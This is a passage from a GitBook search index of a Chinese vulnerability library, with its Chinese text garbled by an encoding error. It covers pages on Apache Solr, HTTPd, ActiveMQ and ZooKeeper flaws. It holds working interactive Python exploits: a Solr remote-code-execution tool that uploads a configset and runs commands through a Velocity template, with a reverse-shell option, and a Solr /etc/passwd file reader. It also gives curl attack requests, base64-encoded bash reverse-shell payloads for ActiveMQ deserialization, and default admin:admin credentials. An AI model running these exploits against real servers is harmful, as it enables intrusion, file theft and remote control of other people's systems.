CVE-2020-13957.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr RCE Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥û CVE-2020-13957.html","title":"Apache Solr RCE Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥û CVE-2020-13957","keywords":"","body":"Apache Solr RCE Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥û CVE-2020-13957 ÊºèÊ¥ûÊèèËø∞ Âú®ÁâπÂÆöÁöÑSolrÁâàÊú¨‰∏≠ConfigSet APIÂ≠òÂú®Êú™ÊéàÊùÉ‰∏ä‰º†ÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂà©Áî®ÊºèÊ¥ûÂèØÂÆûÁé∞ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇ ÂΩ±ÂìçÁâàÊú¨ [!NOTE] Apache Solr 6.6.0 -6.6.5 Apache Solr 7.0.0 -7.7.3 Apache Solr 8.0.0 -8.6.2 ÁéØÂ¢ÉÊê≠Âª∫ ÈÄâÊã©‰∏Ä‰∏™Â≠òÂú®ÊºèÊ¥ûÁöÑÁâàÊú¨ ‰∏ãËΩΩÂêÑÁâàÊú¨SolrÂú∞ÂùÄ ËøôÈáåÂ§çÁé∞‰ΩøÁî®ÁöÑÊòØ Apache Solr 7.7.0 ËøõË°åÂ§çÁé∞ ‰∏ãËΩΩÂêéÊâßË°å‰ª•‰∏ãÂëΩ‰ª§ËøõË°åÁéØÂ¢ÉÈÉ®ÁΩ≤ cd solr-7.7.0 ./bin/solr start -e cloud -force ÁÑ∂Âêé‰∏ÄË∑ØÂõûËΩ¶ÔºåÁõ¥Ëá≥Âá∫Áé∞ Created collection 'gettingstarted' with 2 shard(s), 2 replica(s) with config-set 'gettingstarted' Enabling auto soft-commits with maxTime 3 secs using the Config API POSTing request to Config API: http://localhost:8983/solr/gettingstarted/config {\"set-property\":{\"updateHandler.autoSoftCommit.maxTime\":\"3000\"}} Successfully set-property updateHandler.autoSoftCommit.maxTime to 3000 SolrCloud example running, please visit: http://localhost:8983/solr ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8983/solr/ Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ Âú®ÊîªÂáªÊú∫‰∏ä‰∏ãËΩΩÁõÆÊ†áÁâàÊú¨ÁöÑSolr,ÊâßË°å‰∏ãÂàóÂëΩ‰ª§ÊâìÂåÖÂéãÁº©Êñá‰ª∂ solr-7.7.0/server/solr/configsets/sample_techproducts_configs/conf zip -r - * > vuln.zip Â∞Ü vuln.zip ËøõË°å‰∏ä‰º† curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @vuln.zip \"http://xxx.xxx.xxx.xxx:8983/solr/admin/configs?action=UPLOAD&name=vuln\" [!NOTE] nameÂèÇÊï∞‰∏∫ÂéãÁº©ÂåÖÁöÑÊñá‰ª∂Âêç Âà©Áî®ÊºèÊ¥ûÂàõÂª∫‰∏Ä‰∏™ core curl \"http://xxx.xxx.xxx.xxx:8983/solr/admin/collections?action=CREATE&name=peiqi&numShards=1&replicationFactor=1&wt=xml&collection.configName=vuln\" [!NOTE] nameÂèÇÊï∞‰∏∫ÂàõÂª∫ÁöÑcoreÊ†∏ÂøÉÂêç collection.configNameÂèÇÊï∞‰∏∫‰∏ä‰º†ÁöÑÊñá‰ª∂Âêç Êü•ÁúãcoreÂàóË°®ÔºåÂèëÁé∞Â∑≤ÁªèÊàêÂäüÂàõÂª∫ ÂÜç‰ΩøÁî® Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558 Âç≥ÂèØÊâßË°å‰ªªÊÑèÂëΩ‰ª§ POC‰ΩøÁî®ËØ¶ÊÉÖÂèÇËÄÉÂè¶‰∏ÄÁØáÂ§çÁé∞ÊñáÁ´† ÊºèÊ¥ûÂà©Áî®POC [!NOTE] ‰ΩøÁî®ÂâçÊåâÂ§çÁé∞Ê≠•È™§‰∏ä‰º†ÂØπÂ∫îÁâàÊú¨ÁöÑzipÊñá‰ª∂Ôºå‰æãÂ¶ÇÊàëËøôÈáå‰∏ä‰º†ÁöÑÊñá‰ª∂‰∏∫ qwert.zip,ÂÖ∂‰ªñ‰ΩøÁî®ÊñπÊ≥ï‰∏é Apache Solr VelocityÊ®°ÊùøËøúÁ®ãÊâßË°å CVE-2019-17558 ÁöÑPOC‰ΩøÁî®ÊñπÊ≥ïÁ±ª‰ºº #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys import os import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr 6.6.0 -6.6.5 \\033[0m') print('+ \\033[34m Apache Solr 7.0.0 -7.7.3 \\033[0m') print('+ \\033[34m Apache Solr 8.0.0 -8.6.2 \\033[0m') print('+ \\033[36m‰ΩøÁî®Ê†ºÂºè: python3 cve-2020-13957.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mZip >>> vuln.zip(ZipÊñá‰ª∂Âêç) \\033[0m') print('+------------------------------------------') def POC_1(target_url, file_name): core_name = str(input(\"\\033[35mPlease input Create Core Name\\nCore >>> \\033[0m\")) core_update = \"\"\"%s/solr/admin/collections?action=CREATE&name=%s&numShards=1&replicationFactor=1&wt=xml&collection.configName=%s\"\"\" % (target_url, core_name, file_name.replace(\".zip\",\"\")) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } response = requests.get(url=core_update, headers=headers, timeout=30) if response.status_code != 200: print(\"\\033[31m[x] ÂàõÂª∫CoreÂ§±Ë¥• \\033[0m\") sys.exit(0) else: core = re.findall(r'(.*?)',response.text)[0] vuln_url = target_url + \"/solr/\" + core + \"/config\" print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core + \"/config\\033[0m\") return vuln_url,core def POC_2(target_url, core): open_params = target_url + \"/solr/\" + core + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTËØ∑Ê±ÇÊàêÂäüÂ∞Üparams.resource.loader.enabledËÆæÁΩÆ‰∏∫True \\033[0m\") else: print(\"\\033[31m[x] POSTËØ∑Ê±Çparams.resource.loader.enabledËÆæÁΩÆ‰∏∫TrueÂ§±Ë¥• \\033[0m\") sys.exit(0) def POC_3(target_url, core, cmd): vuln_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vuln_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ‰ª£Á†ÅÊâßË°åÂ§±Ë¥•ÔºåÂìçÂ∫î‰∏∫ Error 500 \\033[0m\") else: print(\"\\033[32m[o] ÊºèÊ¥ûÊàêÂäüÂà©Áî®,ÂìçÂ∫î‰∏∫\\n \\033[0m\",response.text) def POC_4(target_url, core, IP, PORT): # POC : /bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, PORT) vnul_url = target_url + \"/solr/\" + core + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) file_name = str(input(\"\\033[35mPlease input File Name\\nZip >>> \\033[0m\")) vuln_url,core = POC_1(target_url, file_name) POC_2(target_url, core) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mËØ∑ËæìÂÖ•ÁõëÂê¨PORT >>> \\033[0m\")) POC_4(target_url, core, IP, PORT) else: POC_3(target_url, core, cmd) Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache Solr/Apache Solr ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û.html","title":"Apache Solr ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û","keywords":"","body":"Apache Solr ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û ÊºèÊ¥ûÊèèËø∞ Apache Solr Â≠òÂú®‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºåÊîªÂáªËÄÖÂèØ‰ª•Âú®Êú™ÊéàÊùÉÁöÑÊÉÖÂÜµ‰∏ãËé∑ÂèñÁõÆÊ†áÊúçÂä°Âô®ÊïèÊÑüÊñá‰ª∂ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache Solr FOFA [!NOTE] title=\"Solr Admin\" ÊºèÊ¥ûÂ§çÁé∞ ËÆøÈóÆ Solr Admin ÁÆ°ÁêÜÂëòÈ°µÈù¢ Ëé∑ÂèñcoreÁöÑ‰ø°ÊÅØ http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json ÂèëÈÄÅËØ∑Ê±Ç ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} ÂÜçËøõË°åÊñá‰ª∂ËØªÂèñ ËØ∑Ê±ÇÂåÖÂ¶Ç‰∏ã POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd CurlËØ∑Ê±Ç‰∏∫ curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/{corename}/config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\" ÊºèÊ¥ûÂà©Áî®POC [!NOTE] POCËøòÊòØÂª∫Á´ãÂú®Êú™ÊéàÊùÉËÆøÈóÆÁöÑÊÉÖÂÜµ‰∏ã import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34mÂÖ¨‰ºóÂè∑ : PeiQiÊñáÂ∫ì \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mFile >>> Êñá‰ª∂ÂêçÁß∞ÊàñÁõÆÂΩï \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] ÊàêÂäüËé∑Âæócore_name,Url‰∏∫Ôºö\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ÁõÆÊ†áUrlÊºèÊ¥ûÂà©Áî®Â§±Ë¥•\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\":\"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] Ê≠£Âú®ÂáÜÂ§áÊñá‰ª∂ËØªÂèñ...... \\033[0m\".format(target_url)) if \"This\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ÁõÆÊ†á {} ÂèØËÉΩÂ≠òÂú®ÊºèÊ¥û \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ÁõÆÊ†á {} ‰∏çÂ≠òÂú®ÊºèÊ¥û\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) def POC_3(target_url, core_name, File_name): vuln_url = target_url + \"/solr/{}/debug/dump?param=ContentStreams\".format(core_name) headers = { \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'stream.url=file://{}'.format(File_name) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) if \"No such file or directory\" in response.text: print(\"\\033[31m[x] ËØªÂèñ{}Â§±Ë¥• \\033[0m\".format(File_name)) else: print(\"\\033[36m[o] ÂìçÂ∫î‰∏∫:\\n{} \\033[0m\".format(json.loads(response.text)[\"streams\"][0][\"stream\"])) except Exception as e: print(\"\\033[31m[x] ËØ∑Ê±ÇÂ§±Ë¥• \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: File_name = str(input(\"\\033[35mFile >>> \\033[0m\")) POC_3(target_url, core_name, File_name) Goby & POC Â∑≤‰∏ä‰º† https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC ÁõÆÂΩï‰∏≠ Apache_Solr_Arbitrary_File_Read.json ÂèÇËÄÉÊñáÁ´† https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache HTTPd/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache HTTPd/","title":"Apache HTTPd","keywords":"","body":"Apache HTTPd Apache HTTPd Êç¢Ë°åËß£ÊûêÊºèÊ¥û CVE-2017-15715 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache HTTPd/Apache HTTPd Êç¢Ë°åËß£ÊûêÊºèÊ¥û CVE-2017-15715.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache HTTPd/Apache HTTPd Êç¢Ë°åËß£ÊûêÊºèÊ¥û CVE-2017-15715.html","title":"Apache HTTPd Êç¢Ë°åËß£ÊûêÊºèÊ¥û CVE-2017-15715","keywords":"","body":"Apache HTTPd Êç¢Ë°åËß£ÊûêÊºèÊ¥û CVE-2017-15715 ÊºèÊ¥ûÊèèËø∞ Apache HTTPDÊòØ‰∏ÄÊ¨æHTTPÊúçÂä°Âô®ÔºåÂÆÉÂèØ‰ª•ÈÄöËøámod_phpÊù•ËøêË°åPHPÁΩëÈ°µ„ÄÇÂÖ∂2.4.0~2.4.29ÁâàÊú¨‰∏≠Â≠òÂú®‰∏Ä‰∏™Ëß£ÊûêÊºèÊ¥ûÔºåÂú®Ëß£ÊûêPHPÊó∂Ôºå1.php\\x0AÂ∞ÜË¢´ÊåâÁÖßPHPÂêéÁºÄËøõË°åËß£ÊûêÔºåÂØºËá¥ÁªïËøá‰∏Ä‰∫õÊúçÂä°Âô®ÁöÑÂÆâÂÖ®Á≠ñÁï•„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache HTTPd 2.4.0~2.4.29ÁâàÊú¨ ÁéØÂ¢ÉÊê≠Âª∫ https://github.com/vulhub/vulhub.git cd vulhub/httpd/CVE-2017-15715 docker-compose up -d ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8080 Ê≠£Â∏∏Âç≥ÂèØ ÊºèÊ¥ûÂ§çÁé∞ Áõ¥Êé•‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂‰ºöË¢´Êã¶Êà™ ÊäìÂåÖ‰øÆÊîπÂ¶Ç‰∏ãÂèÇÊï∞ ÂìçÂ∫î‰∏∫200ÔºåÊàêÂäüÁªïËøá ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8080/evil.php%0a ÊàêÂäüËß¶ÂèëËß£ÊûêÊºèÊ¥û Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/","title":"Apache ActiveMQ","keywords":"","body":"Apache ActiveMQ Apache ActiveMQ ConsoleÊéßÂà∂Âè∞ Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ Apache ActiveMQ ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2015-5254 Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/Apache ActiveMQ ConsoleÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/Apache ActiveMQ ConsoleÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§.html","title":"Apache ActiveMQ ConsoleÊéßÂà∂Âè∞ÈªòËÆ§Âº±Âè£‰ª§","keywords":"","body":"Apache ActiveMQ Console Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ ÊºèÊ¥ûÊèèËø∞ Apache ActiveMQ Console Â≠òÂú®ÈªòËÆ§Âº±Âè£‰ª§ admin:adminÔºåËøõÂÖ•ÊéßÂà∂Âè∞ÂêéÂèØË¢´Ëøõ‰∏ÄÊ≠•ÊÅ∂ÊÑèÂà©Áî® ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache ActiveMQ ÊºèÊ¥ûÂ§çÁé∞ Apache ActiveMQ ÈªòËÆ§ÂºÄÂêØ‰∫Ü 8186 ÊéßÂà∂Âè∞ ËÆøÈóÆÁõÆÊ†á: http://xxx.xxx.xxx.xxx:8161/admin ‰ΩøÁî®ÈªòËÆ§Âè£‰ª§ admin:admin Goby & POC [!NOTE] Apache ActiveMQ_Console Weak Password Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/Apache ActiveMQ ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2015-5254.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ActiveMQ/Apache ActiveMQ ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2015-5254.html","title":"Apache ActiveMQ ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2015-5254","keywords":"","body":"Apache ActiveMQ ÂèçÂ∫èÂàóÂåñÊºèÊ¥û CVE-2015-5254 ÊºèÊ¥ûÊèèËø∞ Apache ActiveMQÊòØÁæéÂõΩÈòøÂ∏ïÂ•áÔºàApacheÔºâËΩØ‰ª∂Âü∫Èáë‰ºöÊâÄÁ†îÂèëÁöÑ‰∏ÄÂ•óÂºÄÊ∫êÁöÑÊ∂àÊÅØ‰∏≠Èó¥‰ª∂ÔºåÂÆÉÊîØÊåÅJavaÊ∂àÊÅØÊúçÂä°ÔºåÈõÜÁæ§ÔºåSpring FrameworkÁ≠â„ÄÇApache ActiveMQ 5.13.0‰πãÂâç5.xÁâàÊú¨‰∏≠Â≠òÂú®ÂÆâÂÖ®ÊºèÊ¥ûÔºåËØ•ÊºèÊ¥ûÊ∫ê‰∫éÁ®ãÂ∫èÊ≤°ÊúâÈôêÂà∂ÂèØÂú®‰ª£ÁêÜ‰∏≠Â∫èÂàóÂåñÁöÑÁ±ª„ÄÇËøúÁ®ãÊîªÂáªËÄÖÂèØÂÄüÂä©ÁâπÂà∂ÁöÑÂ∫èÂàóÂåñÁöÑJavaÊ∂àÊÅØÊúçÂä°ÔºàJMSÔºâObjectMessageÂØπË±°Âà©Áî®ËØ•ÊºèÊ¥ûÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache ActiveMQ 5.13.0‰πãÂâç5.xÁâàÊú¨ ÊºèÊ¥ûÂ§çÁé∞ È¶ñÂÖà‰∏ãËΩΩ jmet ‰∏ãËΩΩÈìæÊé• wget https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar mkdir external ÂØπÁõÆÊ†áÂèëÈÄÅ‰∏Ä‰∏™ÁîüÊàê/tmp/vulnÁöÑ payload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"touch /tmp/vuln\" -Yp ROME xxx.xxx.xxx.xxx 61616 ËÆøÈóÆ http://xxx.xxx.xxx.xxx:8161/admin/browse.jsp?JMSDestination=event ÂèØ‰ª•ÁúãÂà∞Â§ö‰∫Ü‰∏ÄÊù°Ê∂àÊÅØÈòüÂàó ÁÇπÂáªËøô‰∏™‰ø°ÊÅØËß¶ÂèëÊñá‰ª∂ÂàõÂª∫ ÊàêÂäüÊâßË°åÂëΩ‰ª§ÂàõÂª∫Êñá‰ª∂Ôºå‰πüÂèØ‰ª•ÂàõÂª∫‰∏Ä‰∏™ÂèçÂºπshellÁöÑpayload bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 (base64ÁºñÁ†Å) YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i} ÂèëÈÄÅpayload java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y \"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC94eHgueHh4Lnh4eC54eHgvOTk5OSAwPiYx}|{base64,-d}|{bash,-i}\" -Yp ROME 172.21.231.183 61616 ÂêåÊ†∑ÁÇπÂáªÊ∂àÊÅØÈòüÂàó‰ºöËß¶ÂèëÂëΩ‰ª§ÊâßË°å Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ZooKeeper/":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ZooKeeper/","title":"Apache ZooKeeper","keywords":"","body":"Á®ªËçâ‰∫∫ÂÆâÂÖ®ÊºèÊ¥ûÂ∫ì all right reservedÔºåpowered by GitbookÊñá‰ª∂Êõ¥Êñ∞Êó∂Èó¥Ôºö 2021-07-21 13:48:08 "},"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ZooKeeper/Apache ZooKeeper Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û CVE-2014-085.html":{"url":"book/WebÊúçÂä°Âô®ÊºèÊ¥û/Apache/Apache ZooKeeper/Apache ZooKeeper Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û CVE-2014-085.html","title":"Apache ZooKeeper Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û CVE-2014-085","keywords":"","body":"Apache ZooKeeper Êú™ÊéàÊùÉËÆøÈóÆÊºèÊ¥û CVE-2014-085 ÊºèÊ¥ûÊèèËø∞ ÈªòËÆ§ÂÆâË£ÖÈÖçÁΩÆÂÆåÁöÑzookeeperÂÖÅËÆ∏Êú™ÊéàÊùÉËÆøÈóÆÔºåÁÆ°ÁêÜÂëòÊú™ÈÖçÁΩÆËÆøÈóÆÊéßÂà∂ÂàóË°®ÔºàACLÔºâ„ÄÇÂØºËá¥ÊîªÂáªËÄÖÂèØ‰ª•Âú®ÈªòËÆ§ÂºÄÊîæÁöÑ2181Á´ØÂè£‰∏ãÈÄöËøáÊâßË°åenviÂëΩ‰ª§Ëé∑ÂæóÂ§ßÈáèÊïèÊÑü‰ø°ÊÅØÔºàÁ≥ªÁªüÂêçÁß∞„ÄÅjavaÁéØÂ¢ÉÔºâÂØºËá¥‰ªªÊÑèÁî®Êà∑ÂèØ‰ª•Âú®ÁΩëÁªú‰∏çÂèóÈôêÁöÑÊÉÖÂÜµ‰∏ãËøõË°åÊú™ÊéàÊùÉËÆøÈóÆËØªÂèñÊï∞ÊçÆ ÊºèÊ¥ûÂΩ±Âìç [!NOTE] Apache ZooKeeper ÊºèÊ¥ûÂ§çÁé∞ Apache ZooKeeper ÈªòËÆ§ÂºÄÊîæ 2181Á´ØÂè£ ,‰ΩøÁî®Â¶Ç‰∏ãÂëΩ‰ª§Ëé∑ÂèñÊïèÊÑüÊï∞ÊçÆ echo envi | nc xxx.xxx.xxx.xxx 2181 